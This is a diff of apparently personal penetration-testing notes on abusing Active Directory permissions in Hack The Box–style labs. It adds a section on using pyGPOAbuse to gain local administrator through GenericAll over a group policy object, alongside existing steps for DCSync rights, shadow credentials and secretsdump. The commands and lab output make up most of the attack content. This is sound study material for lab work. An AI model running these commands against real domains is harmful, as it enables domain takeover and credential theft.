@@ -2,7 +2,7 @@
 We can abuse ALL permissions and there is many methodologies, let's just do the most effective and simple move.
 
 ---
-## 1. Method AddMember ACL:
+## 1. AddMember ACL:
 
 Adding current user to the group using "BloodyAD".
 
@@ -17,7 +17,7 @@ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm
 ```
 
 ---
-## 2. Method: Adding our user to the group with net.exe
+## Adding our user to the group with net.exe
 
 1. Creating user and putting him into the Group we want to elevate our privileges.
 
@@ -55,7 +55,7 @@ impacket-secretsdump htb.local/hacker:password@10.129.59.98
 ```
 
 ---
-## 3. Method: Adding our user to the group with PS
+## 3. Adding our user to the group with PS
 
 ```
 Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;  
@@ -67,3 +67,46 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\\Domain Admins' -Rights DCSync
 ```
 
+---
+## GenericAll over group policy objects
+
+The GPOADM User has GenericAll over two group policy objects with high value, as they give full control over the domain itself.
+
+In order to abuse this, we can use an tool called "pyGPOAbuse". Which will add our current user inside the Administrators Group.
+
+1. I need the GPO ID, which BloodHound gives under the "Distinguished Name:" and Gpcpath: variables!
+
+![](Pasted%20image%2020260925214447.png)
+
+**NOTE**: If we have GenericAll over multiple Domain Object Policys, try all of them manually, because one could work and the other can't.
+
+```
+31B2F340-016D-11D2-945F-00C04FB984F9
+```
+
+2. Navigated into virtual environment.
+
+```
+python3 -m venv myenv
+source myenv/bin/activate
+```
+
+3. Installed dependencies.
+
+```
+pip3 install -r requirements.txt
+```
+
+4. Executed the following command, which adds our current user into the Administrators Group.
+
+```
+python3 pygpoabuse.py baby2.vl/GPOADM:'Password123!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
+```
+
+After about 1 minute our current user got added to the Administrators Group!
+
+```
+nxc smb dc.baby2.vl -u GPOADM -p 'Password123!'
+SMB         10.129.76.122   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.76.122   445    DC               [+] baby2.vl\GPOADM:Password123! (Pwn3d!)
+```
